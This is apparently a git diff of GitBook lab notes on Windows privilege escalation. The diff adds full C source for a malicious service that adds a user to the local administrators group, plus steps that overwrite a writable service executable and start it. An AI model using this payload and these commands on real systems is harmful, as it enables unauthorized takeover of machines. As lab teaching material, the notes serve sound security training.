@@ -184,7 +184,7 @@ C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Aut
 
 5\. From the output, notice that the “Everyone” user group has “FILE\_ALL\_ACCESS” permission on the “program.exe” file.
 
-<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploitation
 
@@ -255,7 +255,7 @@ xfreerdp +clipboard /u:TCM /p:Hacker123 /cert:ignore /v:$VICTIM /size:1024x568
 
 1\. Wait for a new session to open in Metasploit.
 
-<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 2\. In Metasploit (msf > prompt) type: sessions -i \[Session ID]\
 3\. To confirm that the attack succeeded, in Metasploit (msf > prompt) type: getuid
@@ -278,7 +278,7 @@ xfreerdp +clipboard /u:TCM /p:Hacker123 /cert:ignore /v:$VICTIM /size:1024x568
 reg query HKLM\Software\Policies\Microsoft\Windows\Installer
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 2.From the output, notice that “AlwaysInstallElevated” value is 1.\
 3.In command prompt type: reg query HKCU\Software\Policies\Microsoft\Windows\Installer
@@ -289,7 +289,7 @@ reg query HKLM\Software\Policies\Microsoft\Windows\Installer
 reg query HKCU\Software\Policies\Microsoft\Windows\Installer
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 4.From the output, notice that “AlwaysInstallElevated” value is 1.
 
@@ -371,7 +371,7 @@ sessions -i 1
 getuid
 ```
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Service Escalation - Registry
 
@@ -413,6 +413,87 @@ copy "C:\Users\User\Desktop\Tools\Source\windows_service.c" \\tsclient\kali\wind
 **Kali VM**
 
 1\. Open windows\_service.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
+
+**windows\_service.c**
+
+```
+#include <windows.h>
+#include <stdio.h>
+
+#define SLEEP_TIME 5000
+
+SERVICE_STATUS ServiceStatus; 
+SERVICE_STATUS_HANDLE hStatus; 
+ 
+void ServiceMain(int argc, char** argv); 
+void ControlHandler(DWORD request); 
+
+//add the payload here
+int Run() 
+{ 
+    system("cmd.exe /k net localgroup administrators user /add");
+    return 0; 
+} 
+
+int main() 
+{ 
+    SERVICE_TABLE_ENTRY ServiceTable[2];
+    ServiceTable[0].lpServiceName = "MyService";
+    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
+
+    ServiceTable[1].lpServiceName = NULL;
+    ServiceTable[1].lpServiceProc = NULL;
+ 
+    StartServiceCtrlDispatcher(ServiceTable);  
+    return 0;
+}
+
+void ServiceMain(int argc, char** argv) 
+{ 
+    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
+    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
+    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
+    ServiceStatus.dwWin32ExitCode      = 0; 
+    ServiceStatus.dwServiceSpecificExitCode = 0; 
+    ServiceStatus.dwCheckPoint         = 0; 
+    ServiceStatus.dwWaitHint           = 0; 
+ 
+    hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandler); 
+    Run(); 
+    
+    ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
+    SetServiceStatus (hStatus, &ServiceStatus);
+ 
+    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
+    {
+		Sleep(SLEEP_TIME);
+    }
+    return; 
+}
+
+void ControlHandler(DWORD request) 
+{ 
+    switch(request) 
+    { 
+        case SERVICE_CONTROL_STOP: 
+			ServiceStatus.dwWin32ExitCode = 0; 
+            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
+            SetServiceStatus (hStatus, &ServiceStatus);
+            return; 
+ 
+        case SERVICE_CONTROL_SHUTDOWN: 
+            ServiceStatus.dwWin32ExitCode = 0; 
+            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
+            SetServiceStatus (hStatus, &ServiceStatus);
+            return; 
+        
+        default:
+            break;
+    } 
+    SetServiceStatus (hStatus,  &ServiceStatus);
+    return; 
+} 
+```
 
 **Kali**
 
@@ -479,11 +560,55 @@ net localgroup administrators
 
 <figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
+## Service Escalation - Executable Files
 
+### Detection
 
+**Windows VM**
 
+1\. Open command prompt and type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
 
+**Victim**
 
+```
+C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
+```
+
+\
+2\. Notice that the “Everyone” user group has “FILE\_ALL\_ACCESS” permission on the filepermservice.exe file.
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+### Exploitation
+
+**Windows VM**
+
+1\. Open command prompt and type: copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
+
+**Victim**
+
+```
+copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
+```
+
+2\. In command prompt type: sc start filepermsvc
+
+**Victim**
+
+```
+sc start filepermsvc
+```
+
+\
+3\. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators
+
+**Victim**
+
+```
+net localgroup administrators
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
